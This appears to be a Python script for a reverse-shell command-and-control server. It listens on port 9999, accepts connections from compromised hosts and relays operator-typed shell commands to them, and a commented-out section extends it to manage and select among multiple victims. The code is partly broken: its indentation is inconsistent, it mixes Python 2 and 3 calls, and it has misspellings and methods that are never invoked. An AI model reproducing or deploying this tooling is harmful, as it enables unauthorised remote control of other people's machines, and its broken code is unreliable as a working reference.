#!/usr/bin/env python 

import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_TREADS = 2 #performing 2 tasks simultaneously....accepting connections and sending commands.
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

# s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.bind(("0.0.0.0",9999))
# s.listen(5)
# conn,address = s.accept()
# print("IP address: "+address[0]+"\nPort: "+str(address[1]))
#send_commands(conn)

def socket_create():
	global host
 	global port
 	global s
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def socket_bind():
 	global host
 	global port
 	global s
 	host = "0.0.0.0"
 	port = 9999
 	s.bind((host,port))
 	s.listen(5)


# # 1st Thread
# def accepting_connection():
# 	for c in all_connections:
# 		c.close()
# 	del all_connections[:]
# 	del all_address[:]

# 	while True:
# 		try:
# 			conn,address = s.accept()
# 			s.setblocking(1) #prevents timeout of connection. 1=true. 
# 			all_connections.append(conn)
# 			all_address.append(address)
# 			print("Connection Established with IP: "+address[0]+" on Port: "+address[1])
# 		except: 
# 			print("Error accepting connections")


# #2nd Thread 1.) See all clients 2.) Select client 3.) Send command
# def start_shell():
# 	while True:
# 		cmd = raw_input("shell$ ")
# 		if cmd == "list":
# 			list_connections()
# 		elif "select" in cmd:
# 			conn = get_target(cmd)
# 			if conn is not None:
# 				send_target_command(conn)
# 		else:
# 			print("Command not recognized\n")


# def list_connections():
# 	result = ''
# 	for i,conn in ennumerate(all_connections):
# 		try:
# 			conn.send(" ")
# 			conn.recv(201480)
# 		except:
# 			del all_connections[i]
# 			del all_address[i]
# 			continue
# 		result = str(i)+".) "+all_address[i][0]+" "+all_address[i][1]+"\n"
# 		print("---CLIENTS---\n\n"+result)

# def get_target(cmd):
# 	try:
# 		target = cmd.replace("select ","")
# 		target = int(target)
# 		conn = all_connections[target]
# 		print("You are now connected to "+str(all_address[target][0])+" on port "+str(all_address[target][1]))
# 		print(str(all_address[target][0])+"> ")
# 		return conn
# 	except:
# 		print("Selection Error")
# 		return None

# def send_target_command(conn):
#   	while True:
#   		try:
# 	  		cmd = raw_input("cmd--> ")
# 	  		# print("cmd is "+str(cmd))
# 	  		if cmd == "exit":
# 	  			break
# 	  			# conn.close()
# 	  			# s.close()
# 	  			# sys.exit()
# 	  		if len(str.encode(cmd)) > 0:
# 	  			# conn.send(cmd)
# 	  			conn.send(cmd)
# 	  			# print(str.encode(cmd))
# 	  			client_response = conn.recv(20480)
# 	  			print(client_response)
# 	  	except:
# 	  		print("Error sending commands")
# 	  		break
# # Create threads
# def create_workers():
# 	for _ in range(NUMBER_OF_TREADS):
# 		t = threading.Thread(target=work) #create work function...like prn in scapy.sniff()
# 		t.daemon = True
# 		t.start

# # Do next job that is in the queue
# def work():
# 	while True:
# 		x=queue.get()
# 		if x == 1:
# 			socket_create()
# 			socket_bind()
# 			accepting_connection()
# 		if x == 2:
# 			start_shell()

# 		queue.task_done()

# def create_jobs():
# 	for x in JOB_NUMBER:
# 		queue.put(x)
# 	queue.join()

# create_workers()
# create_jobs()

def socket_accept():
  	conn,address = s.accept()
  	print("IP address: "+address[0]+"\nPort: "+str(address[1]))
  	send_commands(conn)
  	conn.close	
def send_commands(conn):
  	while True:
  		cmd = raw_input("cmd--> ")
  		# print("cmd is "+str(cmd))
  		if cmd == "exit":
  			conn.close()
  			s.close()
  			sys.exit()
 		if len(str.encode(cmd)) > 0:
  			# conn.send(cmd)
  			conn.send(cmd)
  			# print(str.encode(cmd))
  			client_response = conn.recv(20480)
  			print(client_response)
def main():
  	socket_create()
  	socket_bind()
  	socket_accept()
main()